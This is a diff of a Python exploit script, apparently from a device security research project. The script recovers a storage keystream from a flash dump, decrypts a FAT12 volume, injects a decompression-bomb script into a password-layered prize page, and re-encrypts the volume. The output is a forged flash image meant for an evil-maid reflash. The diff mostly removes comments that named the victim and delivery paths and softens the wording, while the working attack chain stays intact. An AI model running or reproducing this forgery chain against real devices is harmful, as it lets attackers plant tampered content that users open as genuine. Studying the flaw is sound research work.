@@ -1,21 +1,9 @@
 #!/usr/bin/env python3
-"""attack2 evil-maid, full payload swap: replace the prize with a malicious one.
+"""Replace the prize page in a decrypted FAT12 volume and re-encrypt the volume
 
-The storage cipher has no MAC or signature (CWE-345), so an attacker who knows the
-keystream can rewrite the volume and the device serves it back as genuine content.
-This script does the whole chain end to end:
-
-  1. recover the keystream from a cold dump (attack3 engine, no firmware/PIN)
-  2. decrypt the storage into its FAT12 volume
-  3. pull your_prize.zip out, peel its 1337 password layers to the final prize.html
-  4. swap prize.html for a decompression-bomb page (bomb_html) and rebuild the
-     matryoshka with the SAME per-layer passwords, so every layer still looks real
-  5. drop the forged your_prize.zip back into the volume and re-encrypt it
-  6. the result is the ciphertext an evil-maid writes to the flash (chip programmer,
-     BOOTSEL reflash, or WRITE(10) after any unlocked session)
-
-The victim peels the layers exactly as before -- the passwords are unchanged -- and
-opens "the prize" in a browser, where the swapped page runs. Requires mtools and 7z.
+The script reuses attack3 recovery and preserves the ZIP layer passwords
+It writes a storage image and a full flash image but does not program a device
+See attack2/README.md for delivery paths and the limits of the browser payload proof
 """
 import os
 import subprocess
@@ -41,7 +29,6 @@ def build_evil_prize(work, orig_prize_zip):
 
     Returns (new_prize_path, depth, original_final_size, bomb_size).
     """
-    # the outer prize.zip is a plain (unencrypted) zip: readme.txt + layers.zip
     with zipfile.ZipFile(orig_prize_zip) as z:
         names = z.namelist()
         z.extractall(work)
@@ -52,17 +39,14 @@ def build_evil_prize(work, orig_prize_zip):
     final_path, depth = M.unwrap(peel, layers_zip)
     orig_final_size = os.path.getsize(final_path)
 
-    # inject the bomb INTO the original prize.html, keeping its name and its markup:
-    # the page still renders the same, so the victim sees the expected prize
     original = open(final_path, "rb").read()
     injected = bomb_html.inject_bomb(original)
     with open(final_path, "wb") as f:
         f.write(injected)
 
-    new_layers = M.rewrap(peel, final_path, depth)          # same passwords 1..depth
+    new_layers = M.rewrap(peel, final_path, depth)
     os.replace(new_layers, layers_zip)
 
-    # rebuild the outer prize.zip with the original member set (readme.txt + layers.zip)
     new_prize = os.path.join(work, "your_prize_evil.zip")
     with zipfile.ZipFile(new_prize, "w", zipfile.ZIP_DEFLATED) as z:
         for name in names:
@@ -90,7 +74,7 @@ def main(argv):
     A, seed, B, W = res
     print(f"    B=0x{B:08X} W=0x{W:08X} A=0x{A:08X} seed=0x{seed:08X}")
 
-    pt = R.decrypt_all(ct, A, seed, B, W)                   # plaintext FAT12 volume
+    pt = R.decrypt_all(ct, A, seed, B, W)
 
     with tempfile.TemporaryDirectory() as work:
         img = os.path.join(work, "volume.img")
@@ -105,13 +89,12 @@ def main(argv):
         print(f"    depth={depth} layers; prize.html {orig_final} -> {injected_sz} bytes "
               f"(same markup + injected script)")
 
-        # swap the file in the volume; the forged prize is smaller, so it fits
         _mtool("mdel", "-i", img, "::your_prize.zip")
         _mtool("mcopy", "-i", img, new_prize, "::your_prize.zip")
 
         pt2 = open(img, "rb").read()
 
-    ct2 = R.decrypt_all(pt2, A, seed, B, W)                 # XOR is symmetric: this re-encrypts
+    ct2 = R.decrypt_all(pt2, A, seed, B, W)
     forged_dump = bytearray(dump)
     forged_dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN] = ct2
 
@@ -123,16 +106,14 @@ def main(argv):
     print(f"[*] wrote forged storage: {out_path} ({len(ct2)} bytes)")
     print(f"[*] wrote forged full dump: {dump_out} ({len(forged_dump)} bytes)")
 
-    # verification: the device would decrypt the forged storage back to our volume,
-    # the matryoshka still opens with the number passwords, and the final file is the bomb.
     ok = _verify(ct2, A, seed, B, W)
-    print(f"[{'PASS' if ok else 'FAIL'}] forged volume decrypts back, layers intact, "
-          f"final page is the bomb -- nothing rejected it (CWE-345)")
+    print(f"[{'PASS' if ok else 'FAIL'}] offline decryption accepts the forged volume; "
+          f"layers and injected page remain readable (CWE-345)")
     return 0 if ok else 1
 
 
 def _verify(ct2, A, seed, B, W):
-    pt = R.decrypt_all(ct2, A, seed, B, W)                  # what the device read10 would serve
+    pt = R.decrypt_all(ct2, A, seed, B, W)
     with tempfile.TemporaryDirectory() as work:
         img = os.path.join(work, "v.img")
         with open(img, "wb") as f:
@@ -149,8 +130,8 @@ def _verify(ct2, A, seed, B, W):
         os.makedirs(peel)
         final_path, depth = M.unwrap(peel, os.path.join(work, "layers.zip"))
         body = open(final_path, "rb").read()
-        is_bomb = b"DecompressionStream" in body and b"PROOF OF CONCEPT" in body
-        looks_original = b"<img" in body.lower()            # rickroll image still present
+        is_bomb = b"DecompressionStream" in body and b"SEED_B64" in body
+        looks_original = b"<img" in body.lower()
         print(f"    [verify] {depth} layers open with passwords 1..{depth}; "
               f"final {os.path.basename(final_path)}: bomb={is_bomb}, original markup kept={looks_original}")
         return is_bomb and looks_original
